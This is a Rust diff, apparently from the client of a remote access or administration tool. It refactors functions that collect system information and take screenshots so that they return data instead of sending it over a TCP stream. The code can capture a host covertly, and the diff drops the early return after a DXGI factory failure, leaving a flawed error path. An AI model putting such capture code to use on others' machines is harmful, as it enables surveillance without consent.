@@ -16,9 +16,9 @@ use std::ptr;
 
 
 use common::buffers::write_buffer;
-use common::commands::{ ClientInfo, Command };
+use common::async_impl::packets::ClientInfo;
 
-pub fn client_info(write_stream: &mut TcpStream, secret: &Option<Vec<u8>>) {
+pub fn client_info() -> ClientInfo{
     let mut s = System::new_all();
 
     let mut storage = Vec::new();
@@ -43,7 +43,6 @@ pub fn client_info(write_stream: &mut TcpStream, secret: &Option<Vec<u8>>) {
 
         if hr != S_OK {
             eprintln!("Failed to create DXGI Factory");
-            return;
         }
 
         let mut i = 0;
@@ -90,10 +89,10 @@ pub fn client_info(write_stream: &mut TcpStream, secret: &Option<Vec<u8>>) {
         is_elevated: false,
     };
 
-    write_buffer(write_stream, Command::Client(client_data), secret);
+    client_data
 }
 
-pub fn take_screenshot(write_stream: &mut TcpStream, display: i32, secret: &Option<Vec<u8>>) {
+pub fn take_screenshot(display: i32) -> Vec<u8> {
     let screens = Screen::all().unwrap();
 
     let screen = screens[display as usize];
@@ -106,7 +105,7 @@ pub fn take_screenshot(write_stream: &mut TcpStream, display: i32, secret: &Opti
         .write_to(&mut Cursor::new(&mut bytes), image::ImageOutputFormat::Jpeg(35))
         .expect("Couldn't write image to bytes.");
 
-    write_buffer(write_stream, Command::ScreenshotResult(bytes), secret);
+    bytes
 }
 
 const SUFFIX: [&str; 9] = ["B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
